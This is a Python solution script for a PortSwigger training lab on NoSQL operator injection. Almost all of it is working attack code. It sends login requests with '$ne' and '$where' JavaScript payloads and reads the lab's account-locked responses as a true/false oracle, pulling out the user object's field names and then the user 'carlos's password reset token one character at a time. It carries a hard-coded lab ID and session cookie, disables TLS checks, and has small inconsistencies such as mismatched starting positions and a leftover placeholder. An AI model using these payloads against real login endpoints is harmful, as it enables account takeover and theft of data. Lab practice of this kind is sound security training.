# Portswigger Lab: Exploiting NoSQL operator injection to extract unknown fields
# https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields
# Author: d1Zzy666
# Date: 04-10-2024

"""
Execution path:
+ Identify NoSQL injection point (MANUAL)
- Charset needs to include lowercase, uppercase characters and numbers 0-20 as per notes.
- Loop through to identify all the fields on the user object.
- Something
"""

"""
Boolean options:
FALSE - Invalid username or password
TRUE - Account locked: please reset your password
"""

"""
Pre-requisites:
Send a password reset request at https://LABID.web-security-academy.net/forgot-password
"""

# Libraries & imports etc.
import argparse
import base64
from datetime import datetime
import json
from multiprocessing import Process                                   
import os, signal, sys
import re
import requests
from socketserver import TCPServer
import time
import urllib3                                  # Used to suppress SSL warnings
from websocket import create_connection

# global variables
labid = "0ad000df0307165680579487004b0093"              # UPDATE
targetdomain = "web-security-academy.net" 
sessioncookie = "imW2MnC9SMdQgcZSqIfRFznUqOR4Y5C2"      # UPDATE       

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
userobject1 = None
userobject2 = None
userobject3 = None
userobject4 = None
userobject5 = None
falsetxt = "Invalid username"
truetxt = "Account locked"

table_names = []
cleaned_table_names = None


# Proxy via BURP
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# Function can be called for printing a line between - aesthetics of output	
def line():
	return "\n--------------------------------------------------------------------------------\n"

# Check current time
def currentTime():
    return datetime.now().strftime("%d-%m-%Y_%H:%M:%S")

print(datetime.now().strftime("%d-%m-%Y_%H:%M:%S") + " " + " - Portswigger Lab: NoSQL parameter enumeration script...")
print(line())

# Identify all the fields on the user object
def userobj1():
    global userobject1
    global truetxt
    userobject1 = ""
    position = 1
    session = requests.session()
    urllib3.disable_warnings()
    (print("Retrieving fields on user object..."))
    while True:
        found_char = False
        for char in charset:
            url = f"https://{labid}.{targetdomain}:443/login"
            cookies = {"session": f"{sessioncookie}"}
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": f"https://{labid}.{targetdomain}/login", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            json={"username": "carlos", "password": {"$ne": "invalid"},"$where": f"Object.keys(this)[0].match('^.{{{position}}}{char}.*')"}
            x = session.post(url, headers=headers, cookies=cookies, verify=False, json=json, proxies=proxies)
            if f"{truetxt}" in x.text:
                userobject1 += char
                print(f"[+] Identified a character {char} at position {position}.")
                position += 1
                found_char = True
                break

        if not found_char:
            break

    print(f"User object 1 is: {userobject1}")
    print("\n")

def userobj2():
    global userobject2
    global truetxt
    userobject2 = ""
    position = 0
    session = requests.session()
    urllib3.disable_warnings()
    (print("Retrieving fields on user object..."))
    while True:
        found_char = False
        for char in charset:
            url = f"https://{labid}.{targetdomain}:443/login"
            cookies = {"session": f"{sessioncookie}"}
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": f"https://{labid}.{targetdomain}/login", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            json={"username": "carlos", "password": {"$ne": "invalid"},"$where": f"Object.keys(this)[1].match('^.{{{position}}}{char}.*')"}
            x = session.post(url, headers=headers, cookies=cookies, verify=False, json=json, proxies=proxies)
            if f"{truetxt}" in x.text:
                userobject2 += char
                print(f"[+] Identified a character {char} at position {position}.")
                position += 1
                found_char = True
                break

        if not found_char:
            break

    print(f"User object 2 is: {userobject2}")
    print("\n")

def userobj3():
    global userobject3
    global truetxt
    userobject3 = ""
    position = 0
    session = requests.session()
    urllib3.disable_warnings()
    (print("Retrieving fields on user object..."))
    while True:
        found_char = False
        for char in charset:
            url = f"https://{labid}.{targetdomain}:443/login"
            cookies = {"session": f"{sessioncookie}"}
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": f"https://{labid}.{targetdomain}/login", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            json={"username": "carlos", "password": {"$ne": "invalid"},"$where": f"Object.keys(this)[2].match('^.{{{position}}}{char}.*')"}
            x = session.post(url, headers=headers, cookies=cookies, verify=False, json=json, proxies=proxies)
            if f"{truetxt}" in x.text:
                userobject3 += char
                print(f"[+] Identified a character {char} at position {position}.")
                position += 1
                found_char = True
                break

        if not found_char:
            break

    print(f"User object 3 is: {userobject3}")
    print("\n")

def userobj4():
    global userobject4
    global truetxt
    userobject4 = ""
    position = 0
    session = requests.session()
    urllib3.disable_warnings()
    (print("Retrieving fields on user object..."))
    while True:
        found_char = False
        for char in charset:
            url = f"https://{labid}.{targetdomain}:443/login"
            cookies = {"session": f"{sessioncookie}"}
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": f"https://{labid}.{targetdomain}/login", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            json={"username": "carlos", "password": {"$ne": "invalid"},"$where": f"Object.keys(this)[3].match('^.{{{position}}}{char}.*')"}
            x = session.post(url, headers=headers, cookies=cookies, verify=False, json=json, proxies=proxies)
            if f"{truetxt}" in x.text:
                userobject4 += char
                print(f"[+] Identified a character {char} at position {position}.")
                position += 1
                found_char = True
                break

        if not found_char:
            break

    print(f"User object 4 is: {userobject4}")
    print("\n")

def userobj5():
    global userobject5
    global truetxt
    userobject5 = ""
    position = 0
    session = requests.session()
    urllib3.disable_warnings()
    (print("Retrieving fields on user object..."))
    while True:
        found_char = False
        for char in charset:
            url = f"https://{labid}.{targetdomain}:443/login"
            cookies = {"session": f"{sessioncookie}"}
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": f"https://{labid}.{targetdomain}/login", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            json={"username": "carlos", "password": {"$ne": "invalid"},"$where": f"Object.keys(this)[4].match('^.{{{position}}}{char}.*')"}
            x = session.post(url, headers=headers, cookies=cookies, verify=False, json=json, proxies=proxies)
            if f"{truetxt}" in x.text:
                userobject5 += char
                print(f"[+] Identified a character {char} at position {position}.")
                position += 1
                found_char = True
                break

        if not found_char:
            break

    print(f"User object 5 is: {userobject5}")
    print("\n")

# Retrieving password reset token
def passwdreset():
    global userobject5
    passwdrestkn = ""
    position = 0
    session = requests.session()
    urllib3.disable_warnings()
    (print("Retrieving password reset token..."))
    while True:
        found_char = False
        for char in charset:
            url = f"https://{labid}.{targetdomain}:443/login"
            cookies = {"session": f"{sessioncookie}"}
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": f"https://{labid}.{targetdomain}/login", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            json={"username": "carlos", "password": {"$ne": "invalid"},"$where": f"this.{userobject5}.match('^.{{{position}}}{char}.*')"}
            x = session.post(url, headers=headers, cookies=cookies, verify=False, json=json, proxies=proxies)
            if f"Account locked" in x.text:
                passwdrestkn += char
                print(f"[+] Identified a character {char} at position {position}.")
                position += 1
                found_char = True
                break

        if not found_char:
            break

    print(f"Password reset token is: {passwdrestkn}")
    print("\n")

if __name__ == "__main__":
    currentTime()
    userobj1()
    userobj2()
    userobj3()
    userobj4()
    userobj5()
    passwdreset()
